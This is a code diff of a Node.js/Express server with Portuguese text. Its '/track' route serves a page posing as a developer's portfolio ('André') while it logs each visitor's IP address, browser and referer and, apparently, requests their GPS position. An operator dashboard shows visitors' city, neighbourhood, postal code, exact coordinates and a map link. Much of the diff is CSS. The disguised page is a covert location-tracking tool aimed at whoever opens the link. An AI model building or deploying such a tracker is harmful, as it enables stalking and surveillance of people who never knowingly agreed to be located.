@@ -7,7 +7,6 @@ const PORT = process.env.PORT || 8080;
 app.use(express.json());
 
 const clicks = [];
-let clickCounter = 0;
 
 function fetchJSON(url) {
   return new Promise((resolve, reject) => {
@@ -234,40 +233,32 @@ app.get('/', (req, res) => {
               else if (c.userAgent.includes('Safari')) origem = '🧭 Safari';
               else origem = '🌐 Navegador';
               
-              let locationHTML = '';
+              let content = '';
               if (hasGPS) {
-                const gps = c.gpsLocation;
-                locationHTML = \`
-                  <div class="badge badge-success">✅ GPS CAPTURADO</div>
-                  <div class="click-info"><strong>🏙️ Cidade:</strong> \${gps.city}, \${gps.state}, \${gps.country}</div>
-                  \${gps.neighborhood ? \`<div class="click-info"><strong>🏘️ Bairro:</strong> \${gps.neighborhood}</div>\` : ''}
-                  \${gps.postalCode ? \`<div class="click-info"><strong>📮 CEP:</strong> \${gps.postalCode}</div>\` : ''}
-                  <div class="click-info"><strong>🗺️ Coordenadas:</strong> \${gps.latitude.toFixed(6)}, \${gps.longitude.toFixed(6)}</div>
-                  <div class="click-info"><strong>🔗</strong> <a href="https://www.google.com/maps?q=\${gps.latitude},\${gps.longitude}" target="_blank">Ver no Google Maps</a></div>
+                const loc = c.gpsLocation;
+                content = \`
+                  <div class="badge badge-success">✅ GPS ATIVADO</div>
+                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.city}, \${loc.state}, \${loc.country}</div>
+                  \${loc.neighborhood ? \`<div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.neighborhood}</div>\` : ''}
+                  \${loc.postalCode ? \`<div class="click-info">📮 <strong>CEP:</strong> \${loc.postalCode}</div>\` : ''}
+                  <div class="click-info">🗺️ <strong>Coordenadas:</strong> \${loc.latitude.toFixed(6)}, \${loc.longitude.toFixed(6)}</div>
+                  <div class="click-info">📍 <a href="https://www.google.com/maps?q=\${loc.latitude},\${loc.longitude}" target="_blank" style="color:#667eea;">Ver no Google Maps</a></div>
                 \`;
               } else {
-                const permission = c.locationPermission || 'unknown';
-                let statusText = '⚠️ GPS não autorizado';
-                if (permission === 'denied') statusText = '🚫 Usuário negou GPS';
-                else if (permission === 'not_supported') statusText = '❌ Navegador não suporta GPS';
-                
-                locationHTML = \`
-                  <div class="badge badge-warning">\${statusText}</div>
-                  <div class="click-info">Localização por IP (menos precisa)</div>
+                content = \`
+                  <div class="badge badge-warning">⚠️ GPS NÃO AUTORIZADO</div>
+                  <div class="click-info">Usuário negou permissão de localização ou GPS não disponível</div>
                 \`;
               }
               
-              return \`
-                <div class="\${itemClass}">
-                  <div class="click-time">⏰ \${date}</div>
-                  <div class="click-info"><strong>🌐 IP:</strong> \${c.ip}</div>
-                  <div class="click-info"><strong>📱 Origem:</strong> \${origem}</div>
-                  \${locationHTML}
-                  \${c.referer ? \`<div class="click-info"><strong>🔗 Referer:</strong> \${c.referer}</div>\` : ''}
-                </div>
-              \`;
+              return \`<div class="\${itemClass}">
+                <div class="click-time">⏰ \${date}</div>
+                <div class="click-info">🌐 <strong>IP:</strong> \${c.ip}</div>
+                \${content}
+                <div class="click-info">📱 <strong>Origem:</strong> \${origem}</div>
+                <div class="click-info">🔗 <strong>Referer:</strong> \${c.referer || 'Direto'}</div>
+              </div>\`;
             }).join('');
-            
           } catch (error) {
             console.error('Erro ao carregar dados:', error);
           }
@@ -281,40 +272,38 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Rota /track - cria o clique e exibe o portfólio
-app.get('/track', async (req, res) => {
+// Rota /track - Página do portfólio do André
+app.get('/track', (req, res) => {
   const ip = getIP(req);
-  const userAgent = req.headers['user-agent'] || 'Unknown';
-  const referer = req.headers['referer'] || req.headers['referrer'] || 'Acesso direto';
+  const userAgent = req.headers['user-agent'] || '';
+  const referer = req.headers['referer'] || req.headers['referrer'] || 'Direto';
   
-  clickCounter++;
+  // Registrar o clique inicial (sem GPS ainda)
   const clickData = {
-    id: clickCounter,
-    ip,
-    userAgent,
-    referer,
+    id: Date.now(),
+    ip: ip,
+    userAgent: userAgent,
+    referer: referer,
     timestamp: new Date().toISOString(),
-    gpsLocation: null,
-    locationPermission: 'pending'
+    gpsLocation: null
   };
   
   clicks.push(clickData);
   
   console.log('');
-  console.log('🎯 NOVO CLIQUE #' + clickCounter);
-  console.log('  🌐 IP:', ip);
-  console.log('  📱 User-Agent:', userAgent.substring(0, 80));
-  console.log('  🔗 Referer:', referer);
-  console.log('  ⏰', new Date().toLocaleString('pt-BR'));
+  console.log('🔔 NOVO CLIQUE');
+  console.log('  IP:', ip);
+  console.log('  User-Agent:', userAgent.substring(0, 80));
+  console.log('  Referer:', referer);
   
-  // Página do portfólio com rastreamento GPS
+  // Servir a página do portfólio do André
   res.send(`
     <!DOCTYPE html>
     <html lang="pt-BR">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>André - Desenvolvedor Mobile</title>
+        <title>Portfólio - André</title>
         <style>
             * {
                 margin: 0;
@@ -323,15 +312,16 @@ app.get('/track', async (req, res) => {
             }
             
             body {
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-                background: #0a0e27;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                background: #0a0a0a;
                 color: #fff;
                 min-height: 100vh;
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                overflow: hidden;
+                padding: 20px;
                 position: relative;
+                overflow: hidden;
             }
             
             .grid-background {
@@ -341,11 +331,11 @@ app.get('/track', async (req, res) => {
                 width: 100%;
                 height: 100%;
                 background-image: 
-                    linear-gradient(rgba(99, 102, 241, 0.1) 1px, transparent 1px),
-                    linear-gradient(90deg, rgba(99, 102, 241, 0.1) 1px, transparent 1px);
+                    linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
                 background-size: 50px 50px;
                 animation: gridMove 20s linear infinite;
-                z-index: 0;
+                pointer-events: none;
             }
             
             @keyframes gridMove {
@@ -357,111 +347,133 @@ app.get('/track', async (req, res) => {
                 position: absolute;
                 width: 500px;
                 height: 500px;
+                background: radial-gradient(circle, rgba(99, 102, 241, 0.15), transparent 70%);
                 border-radius: 50%;
-                filter: blur(100px);
-                opacity: 0.3;
+                filter: blur(60px);
                 animation: float 8s ease-in-out infinite;
-            }
-            
-            .gradient-orb:nth-child(1) {
-                background: linear-gradient(45deg, #6366f1, #8b5cf6);
-                top: -200px;
-                left: -200px;
+                pointer-events: none;
             }
             
             .gradient-orb:nth-child(2) {
-                background: linear-gradient(45deg, #ec4899, #f43f5e);
-                bottom: -200px;
-                right: -200px;
+                top: 20%;
+                right: 10%;
+                background: radial-gradient(circle, rgba(139, 92, 246, 0.15), transparent 70%);
                 animation-delay: -4s;
             }
             
             @keyframes float {
-                0%, 100% { transform: translate(0, 0) scale(1); }
-                50% { transform: translate(50px, 50px) scale(1.1); }
+                0%, 100% { transform: translate(0, 0); }
+                50% { transform: translate(30px, -30px); }
             }
             
             .container {
-                background: rgba(255, 255, 255, 0.05);
-                backdrop-filter: blur(10px);
-                border: 1px solid rgba(255, 255, 255, 0.1);
-                border-radius: 24px;
-                padding: 48px 40px;
-                max-width: 480px;
-                width: 90%;
-                text-align: center;
-                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                 position: relative;
                 z-index: 1;
+                max-width: 550px;
+                width: 100%;
+                background: rgba(20, 20, 20, 0.8);
+                backdrop-filter: blur(20px);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                border-radius: 24px;
+                padding: 50px 40px;
+                text-align: center;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+                animation: slideUp 0.6s ease;
+            }
+            
+            @keyframes slideUp {
+                from {
+                    opacity: 0;
+                    transform: translateY(30px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
             }
             
             .avatar {
                 width: 100px;
                 height: 100px;
-                border-radius: 50%;
                 background: linear-gradient(135deg, #6366f1, #8b5cf6);
-                margin: 0 auto 24px;
+                border-radius: 50%;
+                margin: 0 auto 25px;
                 display: flex;
                 align-items: center;
                 justify-content: center;
-                font-size: 40px;
+                font-size: 48px;
                 font-weight: bold;
-                box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+                border: 3px solid rgba(255, 255, 255, 0.1);
+                box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3);
             }
             
             h1 {
-                font-size: 32px;
-                margin-bottom: 8px;
-                background: linear-gradient(135deg, #fff, #c7d2fe);
+                font-size: 36px;
+                font-weight: 700;
+                margin-bottom: 10px;
+                background: linear-gradient(135deg, #fff, #a0a0a0);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
                 background-clip: text;
             }
             
             .subtitle {
-                color: #a5b4fc;
+                color: #888;
                 font-size: 18px;
-                margin-bottom: 24px;
+                margin-bottom: 30px;
+                font-weight: 400;
             }
             
             .description {
-                color: #cbd5e1;
+                color: #b0b0b0;
+                font-size: 16px;
                 line-height: 1.6;
-                margin-bottom: 32px;
-                font-size: 15px;
+                margin-bottom: 35px;
             }
             
             .btn {
                 background: linear-gradient(135deg, #6366f1, #8b5cf6);
                 color: white;
                 border: none;
-                padding: 16px 40px;
+                padding: 16px 50px;
                 border-radius: 12px;
-                font-size: 16px;
+                font-size: 17px;
                 font-weight: 600;
                 cursor: pointer;
                 transition: all 0.3s ease;
-                box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+                box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
+                position: relative;
+                overflow: hidden;
                 width: 100%;
+            }
+            
+            .btn::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: -100%;
+                width: 100%;
+                height: 100%;
+                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+                transition: left 0.5s;
+            }
+            
+            .btn:hover::before {
+                left: 100%;
             }
             
             .btn:hover {
                 transform: translateY(-2px);
-                box-shadow: 0 15px 40px rgba(99, 102, 241, 0.5);
+                box-shadow: 0 12px 30px rgba(99, 102, 241, 0.5);
             }
             
             .btn:active {
                 transform: translateY(0);
             }
             
-            .btn:disabled {
-                opacity: 0.6;
-                cursor: not-allowed;
-            }
-            
             .timer {
-                margin-top: 20px;
-                color: #94a3b8;
+                margin-top: 25px;
+                color: #666;
                 font-size: 14px;
             }
             
